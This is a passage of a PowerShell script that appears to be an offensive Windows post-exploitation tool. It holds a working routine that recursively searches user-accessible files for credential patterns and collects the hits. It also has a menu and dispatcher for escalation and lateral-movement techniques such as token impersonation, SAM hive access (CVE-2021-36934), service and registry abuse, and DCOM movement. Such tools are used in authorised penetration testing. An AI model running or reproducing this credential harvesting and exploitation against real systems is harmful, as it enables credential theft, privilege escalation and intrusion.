        $excludeFilesOrDirs = 'cache|node_modules|bower_components|lib|site-packages|dist-packages|vendor|packages|nuget|elasticsearch|maven|gradle|go|lib|include|yarn|composer|rbenv|gem|dependencies|pyenv|python|pycom|pycache|venv|pymakr|wordlist|seclist|extensions|conda|miniconda|sysinternals|blender|game|music|izotop|assetto|elastic|steamapps|resources|ableton|arturia|origin|nvidia|wikipedia|localization|locale|netcore|net.core|asp.net|jdk|native|wow64|amd64_|wowcore|wow.core|' 

        $excludeExtensions  = @('*.exe', '*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp', '*.tiff', '*.tif', '*.psd', '*.xcf', '*.zip', '*.tar.gz', '*.ttf', '*.lock')

        # Build the -Include string dynamically from the $signatures array
        $sigFilenames = $signatures | Where-Object { $_.type -eq 'filename' } | ForEach-Object { $_.match }
        $sigExtensions = $signatures | Where-Object { $_.type -eq 'extension' } | ForEach-Object { $_.match }

        # Combine the filename and extension matches, convert GLOB to Regex, make single expression
        $includeListRegex = @($sigFilenames + $sigExtensions) -replace '\.', '\.' -replace '\*', '.*' -join '|'
        $excludeExtensionsRegex = $excludeExtensions -replace '\.', '\.' -replace '\*', '.*' -join '|'

        # Combine into literal list (remove GLOB)
        $includeListLiteral = @($sigFilenames + $sigExtensions).ForEach({ $_ -replace '\*', '' })

        $includeAttribs = 'Archive,Directory,Hidden,Normal,NotContentIndexed,ReadOnly,System,Temporary'

        $totalMatches = 0
        $allFiles = @() 
        $recursiveDirs = @() 

        # We split processing a bit to get better feedback to the user - it's not really necessary
        Write-Output "[*] Starting directory & file discovery recursively, this will take a while..."
        $dirIndex = 0
        $dirCount = $dirsToSearch.Count
        $searchedDirs = @()
        foreach ($dir in $dirsToSearch) {
            if ($searchedDirs -contains $dir) { continue }
            $resolvedDir = Resolve-Path -Path $dir -ErrorAction SilentlyContinue
            if (-not $resolvedDir) { $searchedDirs += $dir }
            else { $searchedDirs += $resolvedDir.Path }
    
            $dirIndex++
            Write-Progress -Activity "Building Recursive Directory List" -Status "Processing directory $dirIndex of $dirCount | $dir" -PercentComplete (($dirIndex / $dirCount) * 100)
            $recursiveDirs += Get-ChildItem -Path "$dir\*" -Recurse -Directory -ErrorAction  SilentlyContinue | 
            Where-Object { $_.FullName -notmatch $excludeFilesOrDirs }
        }

        $dirCount = $recursiveDirs.Count
        $dirIndex = 0
        $searchedDirs = @()
        foreach ($dir in $recursiveDirs) {
            if ($searchedDirs -contains $dir) { continue }
            $resolvedDir = Resolve-Path -Path $dir -ErrorAction SilentlyContinue
            if (-not $resolvedDir) { $searchedDirs += $dir }
            else { $searchedDirs += $resolvedDir.Path }

            $dirIndex++
            Write-Progress -Activity "Building Recursive File List" -Status "Processing directory $dirIndex of $dirCount | $dir" -PercentComplete (($dirIndex / $dirCount) * 100)
            
            if ($dir.FullName -match $excludeFilesOrDirs) { continue }
            
            # Collect files for current directory
            $files = Get-ChildItem -Path "$dir\*" -Attributes $includeAttribs -ErrorAction SilentlyContinue -Force | 
            Where-Object { 
                $_.Extension -notmatch $excludeExtensionsRegex -and
                $_.FullName -notmatch $excludeFilesOrDirs -and (
                    $_.Extension -match $includeListRegex -or
                    $_.Name.ToLower() -in $includeListLiteral -or
                    $_.Name -match $includeListRegex
                )
            } 

            foreach ($file in $files) {
                if (-not ($allFiles -contains $file.FullName)) {
                    $allFiles += $file.FullName
                }
            }

            $files = $allFiles |
            Where-Object { 
                ((Get-Acl "$($_.FullName)").Access.IdentityReference -match "$env:USERDOMAIN\\$env:USERNAME") -or 
                ((Get-Acl "$($_.FullName)").Owner -match "$env:USERDOMAIN\\$env:USERNAME")
            }

            # Add files to global list
            foreach ($file in $files) {
                if (-not ($allFiles -contains $file.FullName)) {
                    $allFiles += $file.FullName
                }
            }

            # Output number of files found in the directory
            $totalFilesInDir = $files.Count
            if ($DEBUG_MODE) {
                Write-Output "[*] Matching files in $dir`: $totalFilesInDir"
            }
        }

        Write-Output "[*] Total files to search: $($allFiles.Count)"
        Write-Progress -Activity "Building File List" -Status "Completed" -Completed
        $totalFileCount = $allFiles.Count
        $currentFileIndex = 0

        # Avoid regex match hanging / crashing on infinitely long lines
        $maxLineLength = 400

        if ($DEBUG_MODE) { Write-Output "allFiles: $allFiles" }

        foreach ($file in $allFiles) {
            $currentFileIndex++
            $fileSizeMB = 0
            try {
                $fileItem = Get-Item $file.FullName -ErrorAction SilentlyContinue
                $fileSizeMB = if ($null -eq $fileItem) { 0 } else { [math]::ceiling($fileItem.Length / 1MB) }
            }
            catch {
                if ($DEBUG_MODE) { 
                    Write-Output "[!] Error getting file size for: $($file.FullName)" 
                }
            }

            if ($fileSizeMB -eq 0) { continue }

            # Show progress for file processing
            Write-Progress -Activity "Processing Files" -Status "Processing file $currentFileIndex of $totalFileCount - $file - $fileSizeMB MB" -PercentComplete (($currentFileIndex / $totalFileCount) * 100)

            try {
                if ($DEBUG_MODE) { Write-Output "$($file.FullName) | $fileSizeMB"}
                if ($fileSizeMB -gt 4) {
                    Write-Output ("-" * $Host.UI.RawUI.WindowSize.Width)
                    Write-Output ""
                    Write-Output "[+] File: $($file.FullName)"
                    Write-Output "Filename / Extension match. Filesize: $fileSizeMB MB, skipping content scan."
                    Write-Output ""
                } else {
                    $fileContent = Get-Content -Path $file.FullName -ErrorAction SilentlyContinue

                    if ($fileContent.Length -le 0) { continue }
                    
                    $findings = @()                    
                    foreach ($ln in $fileContent -split '\n') {
                        if ($ln.Length -gt $maxLineLength) {
                            # Split very long lines into smaller chunks of maxLineLength
                            $chunks = [regex]::Matches($ln, '.{1,' + $maxLineLength + '}') | ForEach-Object { $_.Value }
                            
                            # Check each chunk for matches
                            foreach ($chunk in $chunks) {
                                $findings += $chunk | Select-String -Pattern $regexPatterns.regex
                            }
                        } else {
                            $findings += $ln | Select-String -Pattern $regexPatterns.regex
                        }
                    }               

                    # If we have any findings
                    $matchCount = $findings.Count

                    if ($matchCount -gt 0) {
                        $totalMatches++

                        # Select the first 25 matches
                        if ($matchCount -gt 25) {
                            $firstCoupleMatches = $findings | Select-Object -First 25 | ForEach-Object { $_ }
                        } 
                        else {
                            $firstCoupleMatches = $findings
                        }

                        # Add findings to the global object
                        foreach ($mt in $firstCoupleMatches) {
                            $gCollect.Credentials += [PSCustomObject]@{
                                FileName = $file.FullName
                                Matches  = $mt
                            }
                        }

                        # Display the first match
                        $firstFinding = $findings[0]
                        $line = $firstFinding.Line
                        $matchStart = $firstFinding.Matches[0].Index
                        $matchLength = $firstFinding.Matches[0].Length

                        $startPos = [Math]::Max(0, $matchStart - 50)
                        $endPos = [Math]::Min($line.Length, $matchStart + $matchLength + 50)

                        $snippet = $line.Substring($startPos, $endPos - $startPos)

                        Write-Output ("-" * $Host.UI.RawUI.WindowSize.Width)
                        Write-Output ""
                       
                        $patType = ""
                        foreach ($pattern in $regexPatterns) {
                            if ($firstFinding.Pattern -eq $pattern.regex) {
                                $patType = "`[$($pattern.name)`]"
                                break
                            }
                        }        

                        Write-Output "[+] $patType File: $($file.FullName)"
                        Write-Output "Line $($firstFinding.LineNumber)`: $snippet"
                        Write-Output ""

                        # Show additional match count
                        if ($matchCount -gt 1) {
                            Write-Output "Additional matches in this file: $($matchCount - 1)"
                            Write-Output ""
                        }
                    }
                }
            } catch {
                if ($DEBUG_MODE) { Write-Output "Could not read file: $($file.FullName), Error: $_" }
            }
        }

        Write-Progress -Activity "Processing Files" -Status "Completed" -Completed

        if ($totalMatches -gt 0) {
            Write-Output "[+] Total Matches: $totalMatches"
            Write-Output ""
            $userResponse = Read-Host "[?] If you're in a desktop session, should we display all findings in a new Desktop-Window (y/n)?"
            if ($userResponse -eq 'y') {
                $gCollect.Credentials | Out-GridView -Title "Credential Findings"
            }
            Write-Output ""
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error while grepping for creds" }
    }    
}

# Menu displayfunction 
function showMenu {
    # Manually assign techniques to an indexed array
    $techniques = @{}
    $techniques[1] = "SePrivileges"
    $techniques[2] = "Service Misconfigurations"
    $techniques[3] = "Scheduled Tasks"
    $techniques[4] = "WMI Event Subscription Abuse"
    $techniques[5] = "Token Impersonation/Manipulation"
    $techniques[6] = "Registry Key Abuse"
    $techniques[7] = "CVE-2021-36934 (SAM Hive Access)"
    $techniques[8] = "Autorun Program Abuse"
    $techniques[9] = "Insecure GPO Permissions"
    $techniques[10] = "COM Object Abuse"
    $techniques[11] = "DCOM Lateral Movement"
    $techniques[12] = "Exploiting Weak EFS Settings"
    $techniques[13] = "Certify SAN"
    $techniques[14] = "Check for presence of vuln drivers"
    $techniques[15] = "Check for creds (only quick wins)"
    $techniques[16] = "Run additional checks for SH collection"
    # Prepare an array to hold the formatted output
    $output = @()

    # Fill output array with techniques, including numbers
    for ($i = 1; $i -le $techniques.Count; $i++) {
        $output += "$i. $($techniques[$i])"
    }

    # Calculate number of columns and format output for two columns
    $numRows = [math]::Ceiling($output.Count / 2)
    $formattedOutput = @()

    for ($i = 0; $i -lt $numRows; $i++) {
        $col1 = if ($i -lt $numRows) { $output[$i] } else { "" }
        $col2 = if ($i + $numRows -lt $output.Count) { $output[$i + $numRows] } else { "" }
        $formattedOutput += [PSCustomObject]@{ Technique = $col1; Column2 = $col2 }
    }

    # Print techniques in two columns
    $formattedOutput | Format-Table -AutoSize -Property Technique, @{Label="";Expression={$_.Column2}}

    # Print letter options in a separate line
    Write-Output "a - Scan & Try, all techniques  s - Scan only, all techniques  e - Enumerate system basics"
    Write-Output "Enter number(s) (e.g., 1,5-7,9) or 'a' for all..."
}

# Input processing
function processInput {
    param (
        [string]$cliInput
    )

    if ($DEBUG_MODE) { Write-Output "Beg. parsedInput var:" $cliInput }

    $scanOnly = $false
    $tryAll = $false
    $optionCount = 16

    if ($cliInput -eq 'a') {
        return @{ Selections = 1..$optionCount; ScanOnly = $scanOnly; TryAll = $tryAll }
    } elseif ($cliInput -like 's*') {
        $cliInput = $cliInput.Substring(1)  # Remove 's' prefix for scanning only
        $scanOnly = $true
    } elseif ($cliInput -like 't*') {
        $cliInput = $cliInput.Substring(1)  # Remove 't' prefix for trying
        $tryAll = $true
    } elseif ($cliInput -like 'q*') {
       exit(0);
    }
    
    $inputArray = $cliInput -split ','
    $parsedInput = @()  # Initialize an empty array for parsed input

    foreach ($item in $inputArray) {
        if ($item -match '^(\d+)-(\d+)$') {
            # Handle ranges (e.g., 5-7)
            $range = $item -split '-'
            $start = [int]$range[0]
            $end = [int]$range[1]
            if ($start -le $end -and $start -ge 1 -and $end -le 12) {
                $parsedInput += $start..$end
            } else {
                if ($DEBUG_MODE) { Write-Output "Invalid range: $item" }
            }
        } elseif ($item -match '^\d+$') {
            # Handle single numbers (1-12)
            $num = [int]$item
            if ($num -ge 1 -and $num -le $optionCount) {
                $parsedInput += $num
            } else {
                if ($DEBUG_MODE) { Write-Output "Invalid selection: $item" }
            }
        } else {
            if ($DEBUG_MODE) { Write-Output "Invalid input: $item" }
        }
    }

    $parsedInput = $parsedInput | Sort-Object -Unique
    if ($DEBUG_MODE) { Write-Output "End. parsedInput var:" $parsedInput }

    return @{ Selections = $parsedInput; ScanOnly = $scanOnly; TryAll = $tryAll }
}

# Main function that runs the selected techniques
function main {
    while ($true) {
        showMenu
        $choice = Read-Host "Your selection"
        if ($DEBUG_MODE) { Write-Output "Raw Input:" $choice }

        $inputData = processInput $choice
        $selections = $inputData.Selections
        $scanOnly = $inputData.ScanOnly

        if ($DEBUG_MODE) { Write-Output "Processed Selections:" $selections }

        if ($selections.Count -eq 0) {
            Write-Output "No valid selections made. Exiting..."
            return
        }

        foreach ($selection in $selections) {
            switch ($selection) {
                1 { checkSePrivileges; if (-not $scanOnly) { trySePrivileges } }
                2 { checkServiceMisconfigurations; if (-not $scanOnly) { tryServiceMisconfigurations } }
                3 { checkScheduledTasks; if (-not $scanOnly) { tryScheduledTasks } }
                4 { checkWMIEventSubscription; if (-not $scanOnly) { tryWMIEventSubscription } }
                5 { checkTokenImpersonation; if (-not $scanOnly) { tryTokenImpersonation } }
                6 { checkRegistryKeyAbuse; if (-not $scanOnly) { tryRegistryKeyAbuse } }
                7 { checkSAMHiveAccess; if (-not $scanOnly) { trySAMHiveAccess } }
                8 { checkAutorunAbuse; if (-not $scanOnly) { tryAutorunAbuse } }
                9 { checkGPOAbuse; if (-not $scanOnly) { tryGPOAbuse } }
                10 { checkCOMObjectAbuse; if (-not $scanOnly) { tryCOMObjectAbuse } }
                11 { checkDCOMLateralMovement; if (-not $scanOnly) { tryDCOMLateralMovement } }
                12 { checkEFSSettings; if (-not $scanOnly) { tryEFSSettings } }
                13 { checkCertySAN; }
                14 { checkDriversPresent; }
                15 { checkCreds; }
                16 { run_SH_collection; }
                default { Write-Output "Invalid selection: $selection" }
            }
        }
    }
}

main
